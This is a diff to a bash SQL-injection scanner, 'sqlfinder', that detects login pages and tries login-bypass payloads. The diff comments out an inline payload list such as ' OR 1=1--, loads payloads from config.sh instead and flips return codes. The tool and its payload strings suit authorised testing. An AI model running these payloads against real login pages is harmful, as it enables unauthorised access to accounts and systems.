@@ -1,6 +1,7 @@
 #!/bin/bash
 # sqlfinder v3.1
 # Configuration
+source config.sh 
 USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
 TIMEOUT=10
 COOKIE_FILE="/tmp/sqli_cookies_$$.txt"
@@ -142,7 +143,7 @@ test_login_sqli() {
     # Check if it's a login page
     if ! is_login_page "$html"; then
        # echo "[-] Not a login page"
-        return 1
+        return 0
     fi
     
     #echo "[+] Login page detected"
@@ -196,18 +197,17 @@ test_login_sqli() {
     # Step 4: Test SQL injection login
     
     # Common SQL injection payloads for login bypass
-    source config.sh
-    
 
-    payloads=(
-        "admin' OR '1'='1'-- -"
-        "administrator'--"
-        "' OR 1=1--"
-        "admin'/*"
-        "' OR 'a'='a"
-        "admin' OR '1'='1'#"
-        "' OR '1'='1'-- -"
-    )
+
+    # payloads=(
+    #     "admin' OR '1'='1'-- -"
+    #     "administrator'--"
+    #     "' OR 1=1--"
+    #     "admin'/*"
+    #     "' OR 'a'='a"
+    #     "admin' OR '1'='1'#"
+    #     "' OR '1'='1'-- -"
+    # )
     
     vulnerable=0
     for payload in "${loginPayloads[@]}"; do
@@ -271,10 +271,10 @@ test_login_sqli() {
         echo -e "${RED}[VULNERABLE] ⚠️  VULNERABLE TO SQL INJECTION LOGIN BYPASS!${NC}"
         echo -e "    URL: ${YELLOW}$base_url${NC}"
         echo -e "    Successful payload: ${YELLOW}$payload${NC}"
-        return 1
+        return 0
     else
         echo "[-] No SQL injection vulnerability detected"
-        return 0
+        return 1
     fi
 }
 
